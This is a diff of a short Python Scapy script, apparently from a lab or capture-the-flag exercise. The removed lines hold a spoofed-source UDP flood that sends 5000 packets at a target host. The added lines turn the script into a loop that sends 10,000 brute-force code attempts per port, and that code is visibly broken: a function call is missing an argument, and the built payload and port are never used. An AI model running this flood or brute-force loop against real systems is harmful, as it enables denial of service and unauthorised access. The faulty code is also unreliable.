@@ -4,41 +4,27 @@ from socket import *
 
 
 # Setup packet parameters
-target = "10.12.1.4"
-spoof = "10.204.0.7"
-payload = "Deactivate!!"
-flood_amt = 5000
-packets = []
+target = "CHANGE THIS TO A THING"
+agent_name = "Ethan Hunt "
+ports = [3, 33, 333, 3333, 33333]
 
-def packet_craft(source_port):
+def packet_craft(agent_name, code_attempt, source_port):
     """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
-    pkt = IP(src=spoof, dst=target)/UDP(sport=source_port, dport=1337)/payload
+    payload = agent_name + code_attempt
+    pkt = IP() / UDP(dport=2600) / agent_name
     return pkt
 
 
-print "Beginning packet crafting ...\n"
+print "Beginning cracking...\n"
 
 # First we craft a large number of packets using a random ephemeral port
-for i in range(flood_amt):
-    source_port = random.randint(1024, 65535)
-    temp_packet = packet_craft(source_port)
-    packets.append(temp_packet)
 
-print "Done crafting packets!\n"
-print "Establishing connection...\n"
+for p in ports:
+    for i in range(10000):
+        pkt = packet_craft(agent_name, i)
+        send(pkt)
+        print "Sent packet {:d} on port {:d}\n".format(i, p)
 
-skt = conf.L3socket(iface="eth0")
-
-print "Connection established!\n"
-print "Beginning flood ...\n"
-
-
-# Initiate a packet flood using our crafted packets
-for p in packets:
-    # verbose field sets output.  0 = silent.
-    # Timeout=0 forces send to operate continuously.
-    skt.sr(p, verbose=0, timeout=0)
-
-print "Done flooding!\n"
+print "Done cracking!\n"
 
 
